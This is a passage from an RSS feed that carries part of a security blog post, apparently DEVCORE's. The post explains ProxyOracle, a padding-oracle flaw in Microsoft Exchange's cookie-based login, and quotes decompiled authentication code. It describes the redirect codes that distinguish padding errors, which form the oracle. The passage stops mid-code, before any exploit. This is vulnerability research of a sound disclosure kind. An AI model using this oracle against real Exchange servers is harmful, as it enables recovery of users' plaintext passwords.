  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/&quot;&gt;A New Attack Surface on MS Exchange Part 1 - ProxyLogon!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/&quot;&gt;A New Attack Surface on MS Exchange Part 2 - ProxyOracle!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell/&quot;&gt;A New Attack Surface on MS Exchange Part 3 - ProxyShell!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/&quot;&gt;A New Attack Surface on MS Exchange Part 4 - ProxyRelay!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2021/08/07/a-new-attack-surface-on-MS-exchange/</link>
                <guid>https://devco.re/blog/2021/08/07/a-new-attack-surface-on-MS-exchange</guid>
                <pubDate>Sat, 07 Aug 2021 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>A New Attack Surface on MS Exchange Part 2 - ProxyOracle!</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    .center-image {
        margin: 0 auto;
        display: block;
    }
&lt;/style&gt;

&lt;p&gt;Hi, this is the part 2 of the New MS Exchange Attack Surface. Because this article refers to several architecture introductions and attack surface concepts in the previous article, you could find the first piece here:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/&quot;&gt;A New Attack Surface on MS Exchange Part 1 - ProxyLogon!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This time, we will be introducing ProxyOracle. Compared with ProxyLogon, ProxyOracle is an interesting exploit with a different approach. By simply leading a user to visit a malicious link, ProxyOracle allows an attacker to recover the userâ€™s password in plaintext  format completely. ProxyOracle consists of two vulnerabilities:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195&quot;&gt;CVE-2021-31195&lt;/a&gt; - Reflected Cross-Site Scripting&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31196&quot;&gt;CVE-2021-31196&lt;/a&gt; - Padding Oracle Attack on Exchange Cookies Parsing&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;where-is-proxyoracle&quot;&gt;Where is ProxyOracle&lt;/h1&gt;

&lt;p&gt;So where is ProxyOracle? Based on the CAS architecture we introduced before, the Frontend of CAS will first serialize the User Identity to a string and put it in the header of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt;. The header will be merged into the clientâ€™s HTTP request and sent to the Backend later. Once the Backend receives, it deserializes the header back to the original User Identity in Frontend.&lt;/p&gt;

&lt;p&gt;We now know how the Frontend and Backend synchronize the User Identity. The next is to explain how the Frontend knows who you are and processes your credentials. The Outlook Web Access (OWA) uses a fancy interface to handle the whole login mechanism, which is called Form-Based Authentication (FBA). The FBA is a special IIS module that inherits the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProxyModule&lt;/code&gt; and is responsible for executing the transformation between the credentials and cookies before entering the proxy logic.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;the-fba-mechanism&quot;&gt;The FBA Mechanism&lt;/h1&gt;

&lt;p&gt;HTTP is a stateless protocol. To keep your login state, FBA saves the username and password in cookies. Every time you visit the OWA, Exchange will parse the cookies, retrieve the credential and try to log in with that. If the login succeed, Exchange will serialize your User Identity into a string, put it into the header of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt;, and forward it to the Backend&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\FbaModule.cs&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnBeginRequestInternal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpApplication&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AuthType&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;FBA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;HandleFbaAuthFormPost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ParseCadataCookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MissingSslCertificateException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;NameValueCollection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nameValueCollection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;NameValueCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;nameValueCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CafeError&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ErrorFE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FEErrorCodes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSLCertificateProblem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;302&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AspNetHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetCafeErrorPageRedirectUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nameValueCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;OnBeginRequestInternal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;All the cookies are encrypted to ensure even if an attacker can hijack the HTTP request, he/she still couldnâ€™t get your credential in plaintext format. FBA leverages 5 special cookies to accomplish the whole de/encryption process:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cadata&lt;/code&gt; - The encrypted username and password&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cadataTTL&lt;/code&gt; - The Time-To-Live timestamp&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cadataKey&lt;/code&gt; - The KEY for encryption&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cadataIV&lt;/code&gt; - The IV for encryption&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cadataSig&lt;/code&gt; - The signature to prevent tampering&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The encryption logic will first generate two 16 bytes random strings as the IV and KEY for the current session. The username and password will then be encoded with Base64, encrypted by the algorithm AES and sent back to the client within cookies. Meanwhile, the IV and KEY will be sent to the user, too. To prevent the client from decrypting the credential by the known IV and KEY directly, Exchange will once again use the algorithm RSA to encrypt the IV and KEY via its SSL certificate private key before sending out!&lt;/p&gt;

&lt;p&gt;Here is a Pseudo Code for the encryption logic:&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;@key&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetServerSSLCert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetPrivateKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cadataSig&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;@key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Fba Rocks!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cadataIV&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;@key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetRandomBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cadataKey&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;@key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetRandomBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

 &lt;span class=&quot;n&quot;&gt;@timestamp&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetCurrentTimestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cadataTTL&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AES_CBC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cadataKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cadataIV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;@timestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

 &lt;span class=&quot;n&quot;&gt;@blob&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Basic &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ToBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cadata&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AES_CBC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cadataKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cadataIV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;@blob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The Exchange takes CBC as its padding mode. If you are familiar with Cryptography, you might be wondering whether the CBC mode here is vulnerable to the Padding Oracle Attack? Bingo! As a matter of fact, Padding Oracle Attack is still existing in such essential software like Exchange in 2021!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/3.gif&quot; alt=&quot;&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;cve-2021-31196---the-padding-oracle&quot;&gt;CVE-2021-31196 - The Padding Oracle&lt;/h1&gt;

&lt;p&gt;When there is something wrong with the FBA, Exchange attaches an error code and redirects the HTTP request back to the original login page. So where is the Oracle? In the cookie decryption, Exchange uses an exception to catch the Padding Error, and because of the exception, the program returned immediately so that error code number is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, which means &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;None&lt;/code&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Location: /OWA/logon.aspx?url=â€¦&amp;amp;reason=0&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In contrast with the Padding Error, if the decryption is good, Exchange will continue the authentication process and try to login with the corrupted username and password. At this moment, the result must be a failure and the error code number is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2&lt;/code&gt;, which represents &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InvalidCredntials&lt;/code&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Location: /OWA/logon.aspx?url=â€¦&amp;amp;reason=2&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The diagram looks like:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With the difference, we now have an Oracle to identify whether the decryption process is successful or not.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\FbaModule.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ParseCadataCookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpApplication&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HttpRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HttpResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cadata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cadataKey&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cadataIV&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text4&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cadataSig&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cadataTTL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;RSACryptoServiceProvider&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsacryptoServiceProvider&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x509Certificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PrivateKey&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RSACryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rgb2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rgb3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsacryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rgb2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;array2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsacryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rgb3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    
